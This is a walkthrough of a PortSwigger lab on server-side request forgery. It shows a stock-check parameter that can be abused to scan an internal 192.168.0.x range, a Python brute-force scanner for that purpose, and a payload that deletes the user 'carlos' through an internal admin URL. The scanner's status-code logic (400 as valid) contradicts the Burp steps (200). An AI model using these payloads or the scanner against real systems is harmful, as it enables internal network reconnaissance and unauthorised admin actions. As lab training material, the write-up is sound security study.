
# #PortSwigger 


![[Pasted image 20251213202214.png]]


## Lab Description

This lab has a stock check feature which fetches data from an internal system.

**Objective:** Use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

---
---


### Step 1: Capture the Stock Check Request

1. In Burp's browser, access the lab
2. Visit a product page
3. Click **Check stock**
4. In Burp Proxy, find the `POST /product/stock` request

**Example request:**
```
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.1:8080/admin
```


![[Pasted image 20251213202229.png]]


---

### Step 2: Send to Intruder

1. Right-click the request --> **Send to Intruder**
2. Highlight the final octet of the IP address (the `1` in `192.168.0.1`)
3. Click **Add §** to set the payload position

**Position marker:**
```
stockApi=http://192.168.0.§1§:8080/admin
```

---

### Step 3: Configure Payloads

|Setting|Value|
|---|---|
|Payload type|Numbers|
|From|1|
|To|255|
|Step|1|

---

### Step 4: Start the Attack

1. Click **Start attack**
2. Sort the results by **Status code** (ascending)
3. Look for a response with status `200`

**From the results:**
```
Status: 200
IP: 192.168.0.67
```

Admin interface found at `http://192.168.0.67:8080/admin`

### Python Script Alternative

so we can use to bruteforce attack for find admin ip
![[Pasted image 20251213202322.png]]

```
import requests

URL = "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net/product/stock"
SESSION_COOKIE = "TWYQD088u1RBHuhIQC9jhWbeT3o2PX6m"
  
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Origin": "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net",
    "Referer": "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net/product?productId=2"
}
  
COOKIES = {
    "session": SESSION_COOKIE
}
  
def test_ip(ip):
    data = {
        "stockApi": f"http://{ip}:8080/admin"
    }
  
    try:
        r = requests.post(
            URL,
            headers=HEADERS,
            cookies=COOKIES,
            data=data,
            timeout=8
        )
        return r.status_code
    except requests.RequestException:
        return None
  
def main():
    print("[*] Starting SSRF internal IP discovery...\n")
  
    for i in range(2, 256):
        ip = f"192.168.0.{i}"
        status = test_ip(ip)
  
        if status == 400:
            print(f"[+] VALID internal host found → {ip} (status 400)")
        elif status == 500:
            print(f"[-] {ip} invalid (500)")
        else:
            print(f"[?] {ip} unexpected response: {status}")

if __name__ == "__main__":
    main()
```


---

### Step 5: Delete Carlos

1. Send the successful request to Repeater
2. Change the `stockApi` parameter to:

```
stockApi=http://192.168.0.67:8080/admin/delete?username=carlos
```


**Full request:**
![[Pasted image 20251213202405.png]]

3. Click **Send**


*web page source code
![[Pasted image 20251213202452.png]]

**Delete 'carlos'**
![[Pasted image 20251213202529.png]]



---

### Step 6: Lab Solved

![[Pasted image 20251213202612.png]]


![[Pasted image 20251213202746.png]]


---
----

